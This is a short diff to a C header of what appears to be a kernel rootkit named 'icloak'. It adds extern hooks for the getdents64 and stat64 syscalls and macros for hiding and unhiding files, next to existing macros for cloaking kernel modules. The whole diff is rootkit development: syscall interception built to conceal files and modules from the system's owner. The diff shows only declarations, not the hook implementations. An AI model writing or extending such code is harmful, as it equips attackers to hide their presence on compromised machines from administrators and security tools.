@@ -10,6 +10,9 @@
 
 #if defined(__linux__)
 # include <linux/incantations.h>
+# include <linux/native_utils.h>
+  extern asmlinkage long (*getdents64_syscall)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
+  extern asmlinkage long (*stat64_syscall)(const char __user *filename, struct stat64 __user *statbuf);
 # elif defined(__FreeBSD__)
 # include <freebsd/incantations.h>
 # else
@@ -25,5 +28,9 @@
 #define icloak_mk_ko_perm(name, exit) native_icloak_mk_ko_perm(name, exit)
 
 #define icloak_mk_ko_nonperm(name, exit) native_icloak_mk_ko_nonperm(name, exit)
+
+#define icloak_hide_file(pattern) native_hide_file(pattern)
+
+#define icloak_show_file(pattern) native_show_file(pattern)
 
 #endif
